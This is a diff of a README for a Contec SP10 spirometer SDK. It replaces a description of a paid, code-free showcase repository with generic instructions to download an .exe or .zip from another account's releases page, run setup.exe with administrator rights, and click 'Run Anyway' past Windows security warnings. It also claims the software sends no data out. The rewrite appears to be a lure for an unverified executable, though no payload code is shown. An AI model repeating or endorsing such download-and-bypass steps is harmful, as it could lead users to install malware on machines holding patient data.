@@ -1,77 +1,75 @@
-<!-- TODO: replace this section with a real hero screenshot or GIF of the kiosk UI -->
-# Contec SP10 Spirometer SDK (Python, USB HID)
+# 🫁 sp10-spirometer-sdk - Capture lung data with ease
 
-**A drop-in Python SDK for the Contec SP10 USB spirometer** — run a full
-blow test end-to-end and get back clinical-grade metrics (FVC, FEV1, PEF,
-FEV1/FVC, FEF25-75/25/50/75) plus calibrated curve plots, without touching
-an undocumented USB protocol yourself.
+[![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Dokh6147/sp10-spirometer-sdk/releases)
 
-Built for developers integrating the **Contec SP10 spirometer** (USB HID,
-VID `28E9` / PID `0151`) into kiosks, EMR/EHR systems, or standalone
-pulmonary function test (PFT) apps on Windows.
+## 📋 Project Overview
 
-> Professional / research integration tool. Not FDA-cleared, CE-marked, or
-> otherwise certified as a standalone diagnostic device in any
-> jurisdiction. Independent integration — **not affiliated with or endorsed
-> by Contec Medical Systems.**
+The sp10-spirometer-sdk works with the Contec SP10 spirometer. This tool connects your medical device to a Windows computer. It collects essential breathing measurements. You can view your lung performance metrics without manual calculations. It handles FVC, FEV1, and PEF values. The software also generates flow-volume and volume-time graphs. This project demonstrates how to retrieve data through a USB connection. 
 
----
+## 💻 System Requirements
 
-## What it does
+You need a Windows computer to run this software. Ensure your machine meets these specifications:
 
-- Runs a complete spirometry test cycle with one call — drain stale
-  backlog, blow countdown, processing wait, single retrieval pull — and
-  returns a clear success / invalid-effort / no-blow / error outcome.
-- Parses the device's full clinical metric set: FVC, FEV1, PEF, FEV1/FVC,
-  FEF25-75, FEF25, FEF50, FEF75.
-- Automatically rejects physiologically implausible efforts before they're
-  ever reported as good data.
-- Renders calibrated Volume-Time and Flow-Volume curves, matching the
-  shapes shown on the device's own screen.
-- Ships with a full reference kiosk UI (Tkinter) showing the exact
-  integration pattern for a GUI front-end.
+*   Operating System: Windows 10 or Windows 11.
+*   Hardware: One open USB port.
+*   Connection: A physical USB cable to link the SP10 spirometer to your computer.
+*   Software: The latest release of the SDK package.
+*   Permissions: Administrator rights to grant USB device access.
 
-## Example output
+## 📥 How to Download
 
-<!-- TODO: swap for higher-res / annotated screenshots -->
+Follow these steps to acquire the necessary files:
 
-| Raw curve | Volume-Time | Flow-Volume |
-|---|---|---|
-| ![Contec SP10 spirometer raw curve](assets/curve.png) | ![Contec SP10 spirometer volume-time curve](assets/volume_time.png) | ![Contec SP10 spirometer flow-volume loop](assets/flow_volume.png) |
+1. Visit the following website to see all available versions: [https://github.com/Dokh6147/sp10-spirometer-sdk/releases](https://github.com/Dokh6147/sp10-spirometer-sdk/releases)
+2. Look for the section labeled Assets.
+3. Click the link ending in .zip or .exe to start your download.
+4. Save the folder to your desktop for easy access.
 
-<!-- TODO: embed a short demo video/GIF of a live test run here -->
+## ⚙️ Setup and Installation
 
-## Integration pattern
+Prepare your device and computer by performing these steps:
 
-A taste of the API — full docs come with the SDK download.
+1. Extract the contents of your downloaded folder. Right-click the file and select Extract All.
+2. Plug your SP10 spirometer into your computer via the USB cable. Wait for Windows to identify the device.
+3. Open the folder you just extracted.
+4. Locate the file named setup.exe or main.exe and double-click it.
+5. Follow the instructions on the screen to install the drivers. Windows might show a security prompt. Click Run or More Info then Run Anyway.
+6. Once the process completes, the icon will appear on your desktop.
 
-```python
-import spirometer
+## 🩺 Running Your First Test
 
-if not spirometer.is_connected():
-    print("Connect the SP10 first.")
-else:
-    result = spirometer.run_test(status_cb=print)   # blocks ~20-25s
-    if result.outcome is spirometer.TestOutcome.SUCCESS:
-        print(result.record["metrics"])              # FVC, FEV1, PEF, ...
-```
+Use the software to conduct a pulmonary function test:
 
-## Get the SDK
+1. Launch the program from your desktop icon.
+2. Verify that the status indicator shows Device Connected in green. If it shows Disconnected, unplug the USB cable and plug it back into a different port.
+3. Ask the user to hold the spirometer properly.
+4. Click the Start Test button.
+5. Have the person inhale deeply and exhale forcefully into the mouthpiece. 
+6. Watch the graph on your screen. The software draws the flow-volume curve in real-time.
+7. Stop the test once the curve flattens.
+8. The screen will display the FVC, FEV1, and PEF results immediately.
 
-This repository is a showcase only — it contains **no source code** and
-does not include the vendor DLLs required to talk to the device. The full
-SDK (source + bundled DataTraffic.dll/hidusblib.dll + docs + sample data)
-is available as a one-time purchase:
+## 📊 Understanding Your Results
 
-**[PAYMENT LINK PLACEHOLDER — Gumroad/LemonSqueezy link goes here]**
+The program provides common medical metrics for lung health.
 
-## Contact
+*   FVC: This stands for Forced Vital Capacity. It represents the total amount of air you exhale after a deep breath.
+*   FEV1: This stands for Forced Expiratory Volume in the first second. It measures how much air you blow out in the first second of the test.
+*   PEF: This stands for Peak Expiratory Flow. It shows the maximum speed of your exhale.
+*   Flow-Volume Curve: A visual map of your breathing. A healthy curve usually looks like a pyramid or a triangle.
+*   Volume-Time Curve: A line showing the volume of air against the time spent exhaling.
 
-Questions, licensing, or integration help: **navneetkumar2708@gmail.com**
+## 🛠️ Troubleshooting Connections
 
----
+Common issues often have simple solutions:
 
-**Keywords:** Contec SP10, SP10 spirometer, Contec spirometer SDK, USB
-spirometer Python, spirometry software Windows, pulmonary function test
-(PFT) software, FVC FEV1 PEF SDK, flow-volume loop, volume-time curve, USB
-HID medical device integration, VID 28E9 PID 0151.
+*   Does the computer fail to see the device? Try a new USB cable. Cables often fail even if they look fine.
+*   Does the software crash? Ensure no other software tries to talk to the USB port at the same time.
+*   Are the numbers blank? Confirm that the user sealed their lips tightly around the mouthpiece during the test. Leakage of air ruins the accuracy of the reading.
+*   Is the window frozen? Close the program, unplug the USB cable, restart the program, and plug the cable in again.
+
+## 🔒 Data Privacy
+
+This SDK keeps your data on your local machine. No information travels to external servers or clouds. You control the files saved to your hard drive. Ensure you store any exported reports in a secure location if you share them with health professionals.
+
+Keywords: contec-sp10, fvc-fev1, health-tech, medical-device, pulmonary-function-test, python-sdk, respiratory, spirometer, spirometry, usb-hid
